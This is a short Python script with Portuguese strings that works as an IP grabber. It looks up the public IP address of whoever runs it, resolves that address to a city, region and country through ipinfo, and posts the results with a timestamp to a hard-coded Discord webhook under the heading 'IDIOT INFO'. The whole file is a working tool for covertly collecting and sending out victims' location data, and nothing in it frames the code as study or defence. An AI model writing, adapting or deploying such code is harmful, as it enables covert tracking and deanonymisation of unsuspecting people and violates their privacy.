import requests
import json
from datetime import datetime

WEBHOOK_URL = 'https://discord.com/api/webhooks/1325500079120973905/1JzItIwS09tE8eWArUc50DUUf_XePJHu1gAxD0EnB9eG6LKhkmMvtcMTTz2vkGD6w0Gv'

def get_ip():
    try:
        ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        return ip
    except requests.exceptions.RequestException:
        return "Não foi possível obter o IP."

def get_location(ip):
    try:
        location_data = requests.get(f'https://ipinfo.io/{ip}/json').json()
        city = location_data.get('city', 'Desconhecido')
        region = location_data.get('region', 'Desconhecido')
        country = location_data.get('country', 'Desconhecido')
        return f'{city}, {region}, {country}'
    except requests.exceptions.RequestException:
        return "Localização desconhecida."

def send_to_discord(info):
    data = {
        "content": f"**IDIOT INFO:**\n\n{info}",
    }
    requests.post(WEBHOOK_URL, data=json.dumps(data), headers={'Content-Type': 'application/json'})

def main():
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = get_ip()
    location = get_location(ip)
    info = f"Data e hora: {current_time}\nIP: {ip}\nLocalização: {location}"
    send_to_discord(info)

if __name__ == "__main__":
    main()
